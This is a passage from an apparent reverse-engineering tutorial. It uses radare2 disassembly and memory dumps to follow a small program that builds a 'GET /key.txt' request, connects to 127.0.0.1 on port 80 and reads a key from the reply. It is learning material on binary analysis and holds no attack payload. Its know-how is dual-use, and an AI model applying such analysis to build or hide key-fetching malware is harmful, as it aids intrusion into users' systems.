<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">arg</span> <span class="kt">int</span> <span class="n">argc</span> <span class="err">@</span> <span class="n">rdi</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">arg</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span> <span class="err">@</span> <span class="n">rsi</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bc4</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bc5</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bc8</span>      <span class="mi">4881</span><span class="n">ecb00100</span><span class="p">.</span>  <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x1b0</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bcf</span>      <span class="mi">89</span><span class="n">bd5cfeffff</span>   <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_1a4h</span><span class="p">],</span> <span class="n">edi</span> <span class="p">;</span> <span class="n">argc</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bd5</span>      <span class="mi">4889</span><span class="n">b550feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_1b0h</span><span class="p">],</span> <span class="n">rsi</span> <span class="p">;</span> <span class="n">argv</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bdc</span>      <span class="mi">64488</span><span class="n">b042528</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273be5</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273be9</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273beb</span>      <span class="mi">48</span><span class="n">b847455420</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x79656b2f20544547</span> <span class="p">;</span> <span class="err">'</span><span class="n">GET</span> <span class="o">/</span><span class="n">key</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bf5</span>      <span class="mi">48</span><span class="n">ba2e747874</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x545448207478742e</span> <span class="p">;</span> <span class="err">'</span><span class="p">.</span><span class="n">txt</span> <span class="n">HTT</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bff</span>      <span class="mi">488985</span><span class="n">a0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_160h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c06</span>      <span class="mi">488995</span><span class="n">a8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_158h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c0d</span>      <span class="mi">48</span><span class="n">b8502f312e</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x550a0d312e312f50</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c17</span>      <span class="mi">48</span><span class="n">ba7365722d</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x6e6567412d726573</span> <span class="p">;</span> <span class="err">'</span><span class="n">ser</span><span class="o">-</span><span class="n">Agen</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c21</span>      <span class="mi">488985</span><span class="n">b0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_150h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c28</span>      <span class="mi">488995</span><span class="n">b8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_148h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c2f</span>      <span class="mi">48</span><span class="n">b8743a206e</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x2e302f636e203a74</span> <span class="p">;</span> <span class="err">'</span><span class="n">t</span><span class="o">:</span> <span class="n">nc</span><span class="o">/</span><span class="mi">0</span><span class="p">.</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c39</span>      <span class="mi">48</span><span class="n">ba302e310d</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x736f480a0d312e30</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c43</span>      <span class="mi">488985</span><span class="n">c0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_140h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c4a</span>      <span class="mi">488995</span><span class="n">c8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_138h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c51</span>      <span class="mi">48</span><span class="n">b8743a2031</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x302e373231203a74</span> <span class="p">;</span> <span class="err">'</span><span class="n">t</span><span class="o">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c5b</span>      <span class="mi">48</span><span class="n">ba2e302e31</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x63410a0d312e302e</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c65</span>      <span class="mi">488985</span><span class="n">d0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_130h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c6c</span>      <span class="mi">488995</span><span class="n">d8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_128h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c73</span>      <span class="mi">48</span><span class="n">b863657074</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x2f2a203a74706563</span> <span class="p">;</span> <span class="err">'</span><span class="n">cept</span><span class="o">:</span> <span class="err">*/'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c7d</span>      <span class="mf">488985e0</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_120h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c84</span>      <span class="n">c785e8feffff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_118h</span><span class="p">],</span> <span class="mh">0xd0a0d2a</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c8e</span>      <span class="mi">66</span><span class="n">c785ecfeff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">word</span> <span class="p">[</span><span class="n">var_114h</span><span class="p">],</span> <span class="mh">0xa</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c97</span>      <span class="n">c7856cfeffff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_194h</span><span class="p">],</span> <span class="mh">0x50</span> <span class="p">;</span> <span class="sc">'P'</span> <span class="p">;</span> <span class="mi">80</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273ca1</span>      <span class="n">ba00000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273ca6</span>      <span class="n">be01000000</span>     <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="mi">1</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cab</span>      <span class="n">bf02000000</span>     <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mi">2</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cb0</span>      <span class="n">e8ebfbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">socket</span>     <span class="p">;</span> <span class="kt">int</span> <span class="n">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cb5</span>      <span class="mi">898570</span><span class="n">feffff</span>   <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_190h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cbb</span>      <span class="mi">488</span><span class="n">d3dfe0100</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">str</span><span class="p">.</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>  <span class="p">;</span> <span class="mh">0x55fa6e273ec0</span> <span class="p">;</span> <span class="s">"127.0.0.1"</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cc2</span>      <span class="n">e879fbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">gethostbyname</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cc7</span>      <span class="mi">48898578</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_188h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cce</span>      <span class="mi">488</span><span class="n">d8580feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cd5</span>      <span class="n">be10000000</span>     <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="mh">0x10</span>           <span class="p">;</span> <span class="mi">16</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cda</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cdd</span>      <span class="n">e88efbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">bzero</span>      <span class="p">;</span> <span class="kt">void</span> <span class="n">bzero</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273ce2</span>      <span class="mi">66</span><span class="n">c78580feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">word</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">],</span> <span class="mi">2</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273ceb</span>      <span class="mi">488</span><span class="n">b8578feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_188h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cf2</span>      <span class="mi">8</span><span class="n">b4014</span>         <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cf5</span>      <span class="mi">4863</span><span class="n">d0</span>         <span class="n">movsxd</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cf8</span>      <span class="mi">488</span><span class="n">b8578feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_188h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cff</span>      <span class="mi">488</span><span class="n">b4018</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">rax</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d03</span>      <span class="mi">488</span><span class="n">b00</span>         <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">rax</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d06</span>      <span class="mi">488</span><span class="n">d8d80feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d0d</span>      <span class="mi">4883</span><span class="n">c104</span>       <span class="n">add</span> <span class="n">rcx</span><span class="p">,</span> <span class="mi">4</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d11</span>      <span class="mi">4889</span><span class="n">ce</span>         <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rcx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d14</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d17</span>      <span class="n">e834fbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">bcopy</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d1c</span>      <span class="mi">8</span><span class="n">b856cfeffff</span>   <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_194h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d22</span>      <span class="mi">0</span><span class="n">fb7c0</span>         <span class="n">movzx</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d25</span>      <span class="mi">89</span><span class="n">c7</span>           <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d27</span>      <span class="n">e8e4faffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">htons</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d2c</span>      <span class="mi">66898582</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">word</span> <span class="p">[</span><span class="n">var_17eh</span><span class="p">],</span> <span class="n">ax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d33</span>      <span class="mi">488</span><span class="n">d8d80feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rcx</span><span class="p">,</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d3a</span>      <span class="mi">8</span><span class="n">b8570feffff</span>   <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_190h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d40</span>      <span class="n">ba10000000</span>     <span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mh">0x10</span>           <span class="p">;</span> <span class="mi">16</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273d45</span>      <span class="mi">4889</span><span class="n">ce</span>  
</code></pre></div></div>
<p>Again this is very similar to what we saw on the previous tutorial.</p>

<p>The program starts by loading the get request string</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>           <span class="mh">0x55fa6e273beb</span>      <span class="mi">48</span><span class="n">b847455420</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x79656b2f20544547</span> <span class="p">;</span> <span class="err">'</span><span class="n">GET</span> <span class="o">/</span><span class="n">key</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bf5</span>      <span class="mi">48</span><span class="n">ba2e747874</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x545448207478742e</span> <span class="p">;</span> <span class="err">'</span><span class="p">.</span><span class="n">txt</span> <span class="n">HTT</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273bff</span>      <span class="mi">488985</span><span class="n">a0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_160h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c06</span>      <span class="mi">488995</span><span class="n">a8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_158h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c0d</span>      <span class="mi">48</span><span class="n">b8502f312e</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x550a0d312e312f50</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c17</span>      <span class="mi">48</span><span class="n">ba7365722d</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x6e6567412d726573</span> <span class="p">;</span> <span class="err">'</span><span class="n">ser</span><span class="o">-</span><span class="n">Agen</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c21</span>      <span class="mi">488985</span><span class="n">b0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_150h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c28</span>      <span class="mi">488995</span><span class="n">b8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_148h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c2f</span>      <span class="mi">48</span><span class="n">b8743a206e</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x2e302f636e203a74</span> <span class="p">;</span> <span class="err">'</span><span class="n">t</span><span class="o">:</span> <span class="n">nc</span><span class="o">/</span><span class="mi">0</span><span class="p">.</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c39</span>      <span class="mi">48</span><span class="n">ba302e310d</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x736f480a0d312e30</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c43</span>      <span class="mi">488985</span><span class="n">c0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_140h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c4a</span>      <span class="mi">488995</span><span class="n">c8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_138h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c51</span>      <span class="mi">48</span><span class="n">b8743a2031</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x302e373231203a74</span> <span class="p">;</span> <span class="err">'</span><span class="n">t</span><span class="o">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c5b</span>      <span class="mi">48</span><span class="n">ba2e302e31</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rdx</span><span class="p">,</span> <span class="mh">0x63410a0d312e302e</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c65</span>      <span class="mi">488985</span><span class="n">d0feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_130h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c6c</span>      <span class="mi">488995</span><span class="n">d8feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_128h</span><span class="p">],</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c73</span>      <span class="mi">48</span><span class="n">b863657074</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x2f2a203a74706563</span> <span class="p">;</span> <span class="err">'</span><span class="n">cept</span><span class="o">:</span> <span class="err">*/'</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c7d</span>      <span class="mf">488985e0</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_120h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c84</span>      <span class="n">c785e8feffff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_118h</span><span class="p">],</span> <span class="mh">0xd0a0d2a</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c8e</span>      <span class="mi">66</span><span class="n">c785ecfeff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">word</span> <span class="p">[</span><span class="n">var_114h</span><span class="p">],</span> <span class="mh">0xa</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273c97</span>      <span class="n">c7856cfeffff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_194h</span><span class="p">],</span> <span class="mh">0x50</span> <span class="p">;</span> <span class="sc">'P'</span> <span class="p">;</span> <span class="mi">80</span>
</code></pre></div></div>
<p>So the string gets loaded well in memory:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e273cb0</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffc9a81e5c0</span>
<span class="mh">0x7ffc9a81e5c0</span>  <span class="mh">0x20544547</span> <span class="mh">0x79656b2f</span> <span class="mh">0x7478742e</span> <span class="mh">0x54544820</span>  <span class="n">GET</span> <span class="o">/</span><span class="n">key</span><span class="p">.</span><span class="n">txt</span> <span class="n">HTT</span>
<span class="mh">0x7ffc9a81e5d0</span>  <span class="mh">0x2e312f50</span> <span class="mh">0x550a0d31</span> <span class="mh">0x2d726573</span> <span class="mh">0x6e656741</span>  <span class="n">P</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="p">..</span><span class="n">User</span><span class="o">-</span><span class="n">Agen</span>
<span class="mh">0x7ffc9a81e5e0</span>  <span class="mh">0x6e203a74</span> <span class="mh">0x2e302f63</span> <span class="mh">0x0d312e30</span> <span class="mh">0x736f480a</span>  <span class="n">t</span><span class="o">:</span> <span class="n">nc</span><span class="o">/</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">..</span><span class="n">Hos</span>
<span class="mh">0x7ffc9a81e5f0</span>  <span class="mh">0x31203a74</span> <span class="mh">0x302e3732</span> <span class="mh">0x312e302e</span> <span class="mh">0x63410a0d</span>  <span class="n">t</span><span class="o">:</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">..</span><span class="n">Ac</span>
<span class="mh">0x7ffc9a81e600</span>  <span class="mh">0x74706563</span> <span class="mh">0x2f2a203a</span> <span class="mh">0x0d0a0d2a</span> <span class="mh">0x0000000a</span>  <span class="n">cept</span><span class="o">:</span> <span class="err">*/</span><span class="o">*</span><span class="p">.......</span>
</code></pre></div></div>
<p>Then comes the socket creation and initialization through connect</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="mh">0x55fa6e273cb0</span> <span class="n">b</span>    <span class="n">e8ebfbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">socket</span>     <span class="p">;</span> <span class="kt">int</span> <span class="n">socket</span><span class="p">(</span><span class="kt">int</span> <span class="n">domain</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">protocol</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cb5</span>      <span class="mi">898570</span><span class="n">feffff</span>   <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_190h</span><span class="p">],</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cbb</span>      <span class="mi">488</span><span class="n">d3dfe0100</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">str</span><span class="p">.</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>  <span class="p">;</span> <span class="mh">0x55fa6e273ec0</span> <span class="p">;</span> <span class="s">"127.0.0.1"</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cc2</span>      <span class="n">e879fbffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">gethostbyname</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cc7</span>      <span class="mi">48898578</span><span class="n">feff</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_188h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cce</span>      <span class="mi">488</span><span class="n">d8580feff</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_180h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cd5</span>      <span class="n">be10000000</span>     <span class="n">mov</span> <span class="n">esi</span><span class="p">,</span> <span class="mh">0x10</span>           <span class="p">;</span> <span class="mi">16</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273cda</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
</code></pre></div></div>
<p>As well as the buffer initialization with bzero, nothing much to comment.</p>

<p>Then the read from the server:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>           <span class="mh">0x55fa6e273dd5</span>      <span class="n">e856faffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">read</span>       <span class="p">;</span> <span class="kt">ssize_t</span> <span class="n">read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fildes</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">nbyte</span><span class="p">)</span>
<span class="err">│</span>           <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">│</span>           <span class="mh">0x55fa6e273dda</span> <span class="n">b</span>    <span class="mi">898574</span><span class="n">feffff</span>   <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_18ch</span><span class="p">],</span> <span class="n">eax</span>
</code></pre></div></div>
<p>So after the read we see the key has been delivered:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55fa6e273dda</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x7ffc9a81e610</span>
<span class="mh">0x7ffc9a81e610</span>  <span class="mh">0x50545448</span> <span class="mh">0x312e312f</span> <span class="mh">0x30303220</span> <span class="mh">0x0d4b4f20</span>  <span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> <span class="mi">200</span> <span class="n">OK</span><span class="p">.</span>
